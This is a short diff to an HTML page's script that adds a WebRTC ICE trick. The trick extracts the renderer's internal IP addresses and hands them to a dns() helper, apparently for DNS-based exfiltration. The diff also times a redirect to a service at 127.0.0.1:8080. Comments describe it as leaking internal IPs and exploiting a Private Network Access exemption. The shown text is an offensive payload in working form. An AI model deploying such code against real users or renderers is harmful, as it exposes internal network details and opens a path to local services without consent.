@@ -11,11 +11,26 @@ function dns(label) {
 
 dns('v12-start');
 
-// After 500ms redirect to 8080 (PNA-exempt top-level navigation → real GET, not OPTIONS)
+// WebRTC ICE: leaks the renderer's actual internal IP via SDP
+try {
+  var pc = new RTCPeerConnection({iceServers: []});
+  pc.createDataChannel('x');
+  pc.onicecandidate = function(e) {
+    if (e.candidate && e.candidate.candidate) {
+      var c = e.candidate.candidate;
+      // Extract IP from candidate string: "candidate:... IP port ..."
+      var m = c.match(/(\d+\.\d+\.\d+\.\d+)/g);
+      if (m) m.forEach(function(ip) { dns('ice-' + ip.replace(/\./g,'-')); });
+    }
+  };
+  pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+} catch(e) { dns('ice-exc-' + (e.name||'').substring(0,6)); }
+
+// Redirect to 8080 after 800ms (ICE above fires first, giving us internal IP)
 setTimeout(function() {
-  dns('v12-redir-8080-now');
+  dns('v12-redir-8080');
   window.location.href = 'http://127.0.0.1:8080/';
-}, 500);
+}, 800);
 </script>
 </body>
 </html>
